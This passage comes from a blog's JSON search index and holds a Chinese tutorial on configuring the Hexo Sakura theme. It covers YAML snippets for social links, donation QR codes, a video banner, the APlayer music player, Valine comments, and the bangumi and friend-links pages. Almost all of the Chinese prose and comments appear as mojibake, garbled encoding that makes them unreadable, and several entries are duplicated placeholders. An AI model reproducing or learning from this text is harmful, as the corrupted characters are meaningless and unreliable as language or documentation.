&#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/email.svg&#125; wechat: &#123;url: /#, qrcode: /img/custom/wechat.jpg, img: /img/social/wechat.png&#125; # ç¤¾äº¤æŒ‰é’®(msocial) url, img ç§»åŠ¨ç«¯é…ç½® ã€æ”¹ã€‘ msocial: github: &#123;url: http://github.com/honjun, fa: fa-github, color: 333&#125; weibo: &#123;url: http://weibo.com/mashirozx?is_all=1, fa: fa-weibo, color: dd4b39&#125; qq: &#123;url: https://wpa.qq.com/msgrd?v=3&amp;uin=954655431&amp;site=qq&amp;menu=yes, fa: fa-qq, color: 25c6fe&#125; # èµèµäºŒç»´ç ï¼ˆå…¶ä¸­wechatSQæ˜¯èµèµå•é¡µé¢çš„èµèµç å›¾ç‰‡ï¼‰ã€æ”¹ã€‘ donate: alipay: /img/custom/donate/AliPayQR.jpg wechat: /img/custom/donate/WeChanQR.jpg wechatSQ: /img/custom/donate/WeChanSQ.jpg # é¦–é¡µè§†é¢‘åœ°å€ä¸ºhttps://cdn.jsdelivr.net/gh/honjun/hojun@1.2/Unbroken.mp4ï¼Œé…ç½®å¦‚ä¸‹ ã€æ”¹ã€‘ movies: url: https://cdn.jsdelivr.net/gh/honjun/hojun@1.2 # å¤šä¸ªè§†é¢‘ç”¨é€—å·éš”å¼€ï¼Œéšæœºè·å–ã€‚æ”¯æŒçš„æ ¼å¼ç›®å‰å·²çŸ¥MP4,Flvã€‚å…¶ä»–çš„å¯ä»¥è¯•ä¸‹ï¼Œä¸ä¿è¯æœ‰ç”¨ name: Unbroken.mp4 # å·¦ä¸‹è§’aplayeræ’­æ”¾å™¨é…ç½® ä¸»è¦æ”¹idå’Œserverè¿™ä¸¤é¡¹ï¼Œä¿®æ”¹è¯¦è§[aplayeræ–‡æ¡£] ã€æ”¹ã€‘ aplayer: id: 2660651585 server: netease type: playlist fixed: true mini: false autoplay: false loop: all order: random preload: auto volume: 0.7 mutex: true # Valineè¯„è®ºé…ç½®ã€æ”¹ã€‘ valine: true v_appId: GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz v_appKey: mgOpfzbkHYqU92CV4IDlAUHQ åˆ†ç±»é¡µå’Œæ ‡ç­¾é¡µé…ç½®åˆ†ç±»é¡µ æ ‡ç­¾é¡µ é…ç½®é¡¹åœ¨\\themes\\Sakura\\languages\\zh-cn.ymlé‡Œã€‚æ–°å¢ä¸€ä¸ªåˆ†ç±»æˆ–æ ‡ç­¾æœ€å¥½åŠ ä¸‹å“¦ï¼Œå½“ç„¶å«Œéº»çƒ¦å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€å¼ é»˜è®¤å›¾ç‰‡ï¼ˆå¯ä»¥æ”¹ä¸»é¢˜æˆ–è€…ç›´æ¥æŠŠ404å›¾ç‰‡æ›¿æ¢ä¸‹ï¼Œå¾æ±‚ä¸‹æ„è§è¦ä¸è¦ç»™è¿™ä¸ªåœ¨é…ç½®æ–‡ä»¶ä¸­åŠ ä¸ªå¼€å…³ï¼Œå¯ä»¥issueæˆ–ç¾¤é‡Œæå‡ºæ¥ï¼‰ï¼Œç°åœ¨æ˜¯æ²¡è®¾ç½®çš„è¯ä¼šä½¿ç”¨é‚£ç§å€’ç«‹å°ç‹—404å“¦ã€‚ #category # æŒ‰åˆ†ç±»ååˆ›å»º æŠ€æœ¯: #ä¸­æ–‡æ ‡é¢˜ zh: é‡ç”ŸæŠ€æœ¯åä¼š # è‹±æ–‡æ ‡é¢˜ en: Geek â€“ Only for Love # å°é¢å›¾ç‰‡ img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/coding.jpg ç”Ÿæ´»: zh: ç”Ÿæ´» en: live img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/writing.jpg #tag # æ ‡ç­¾åå³æ˜¯æ ‡é¢˜ æ‚¦è¯»: # å°é¢å›¾ç‰‡ img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/reading.jpg å•é¡µé¢å°é¢é…ç½®å¦‚ç•™è¨€æ¿é¡µé¢é¡µé¢ï¼Œä½äºsourceä¸‹çš„commentä¸‹ï¼Œæ‰“å¼€index.mdå¦‚ä¸‹ï¼š --- title: comment date: 2018-12-20 23:13:48 keywords: ç•™è¨€æ¿ description: comments: true # åœ¨è¿™é‡Œé…ç½®å•é¡µé¢å¤´éƒ¨å›¾ç‰‡ï¼Œè‡ªå®šä¹‰æ›¿æ¢å“¦~ photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/comment.jpg --- å•é¡µé¢é…ç½®ç•ªç»„è®¡åˆ’é¡µ ï¼ˆè¯·ç›´æ¥åœ¨ä¸‹è½½åçš„æ–‡ä»¶ä¸­æ”¹ï¼Œä¸‹é¢çš„æ·»åŠ äº†æ³¨é‡Šå¯èƒ½ä¼šæœ‰äº›å½±å“ï¼‰ --- layout: bangumi title: bangumi comments: false date: 2019-02-10 21:32:48 keywords: description: bangumis: # ç•ªç»„å›¾ç‰‡ - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg # ç•ªç»„å title: æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ± # è¿½ç•ªçŠ¶æ€ ï¼ˆè¿½ç•ªing/å·²è¿½å®Œï¼‰ status: å·²è¿½å®Œ # è¿½ç•ªè¿›åº¦ progress: 100 # ç•ªå‰§æ—¥æ–‡åç§° jp: ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã† # æ”¾é€æ—¶é—´ time: æ”¾é€æ—¶é—´: 2018-02-24 SUN. # ç•ªå‰§ä»‹ç» desc: ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚ - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg title: æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ± status: å·²è¿½å®Œ progress: 50 jp: ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã† time: æ”¾é€æ—¶é—´: 2018-02-24 SUN. desc: ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚ --- å‹é“¾é¡µ ï¼ˆè¯·ç›´æ¥åœ¨ä¸‹è½½åçš„æ–‡ä»¶ä¸­æ”¹ï¼Œä¸‹é¢çš„æ·»åŠ äº†æ³¨é‡Šå¯èƒ½ä¼šæœ‰äº›å½±å“ï¼‰ --- layout: links title: links # åˆ›å»ºæ—¥æœŸï¼Œå¯ä»¥æ”¹ä¸‹ date: 2018-12-19 23:11:06 # å›¾ç‰‡ä¸Šçš„æ ‡é¢˜ï¼Œè‡ªå®šä¹‰ä¿®æ”¹ keywords: å‹äººå¸ description: # true/false å¼€å¯/å…³é—­è¯„è®º comments: true # é¡µé¢å¤´éƒ¨å›¾ç‰‡ï¼Œè‡ªå®šä¹‰ä¿®æ”¹ photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/links.jpg # å‹é“¾é…ç½® links: # ç±»å‹åˆ†ç»„ - group: ä¸ªäººé¡¹ç›® # ç±»å‹ç®€ä»‹ desc: å……åˆ†è¯´æ˜è¿™å®¶ä¼™æ˜¯æ¡å’¸é±¼ &lt; (ï¿£ï¸¶ï¿£)&gt; items: # å‹é“¾é“¾æ¥ - url: https://shino.cc/fgvf # å‹é“¾å¤´åƒ img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg # å‹é“¾ç«™ç‚¹å name: Google # å‹é“¾ä»‹ç» ä¸‹é¢é›·åŒ desc: Google é•œåƒ - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google é•œåƒ # ç±»å‹åˆ†ç»„... - group: å°ä¼™ä¼´ä»¬ desc: æ¬¢è¿äº¤æ¢å‹é“¾ ê‰‚(ËŠá—œË‹) items: - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google é•œåƒ - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google é•œåƒ --- å†™æ–‡ç« é…ç½®ä¸»é¢˜é›†æˆäº†ä¸ªäººæ’ä»¶hexo-tag-biliå’Œhexo-tag-fancybox_imgã€‚å…¶ä¸­hexo-tag-biliç”¨æ¥åœ¨æ–‡ç« æˆ–å•é¡µé¢ä¸­æ’å…¥Bç«™å¤–é“¾è§†é¢‘ï¼Œä½¿ç”¨è¯­æ³•å¦‚ä¸‹ï¼š &#123;% bili video_id [page] %&#125; è¯¦ç»†ä½¿ç”¨æ•™ç¨‹è¯¦è§hexo-tag-biliã€‚ hexo-tag-fancybox_imgç”¨æ¥åœ¨æ–‡ç« æˆ–å•é¡µé¢ä¸­å›¾ç‰‡ï¼Œä½¿ç”¨è¯­æ³•å¦‚ä¸‹ï¼š &#123;% fb_img src [caption] %&#125; è¯¦ç»†ä½¿ç”¨æ•™ç¨‹è¯¦è§hexo-tag-fancybox_img è¿˜æœ‰å•¥ï¼Œä¸€æ—¶æƒ³ä¸èµ·æ¥â€¦â€¦To be continuedâ€¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pipimi110.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pipimi110.github.io/tags/web/"},{"name":"æ‚¦è¯»","slug":"æ‚¦è¯»","permalink":"https://pipimi110.github.io/tags/%E6%82%A6%E8%AF%BB/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pipimi110.github.io/categories/%E6%8A%80%E6%9C%AF/"}]}]}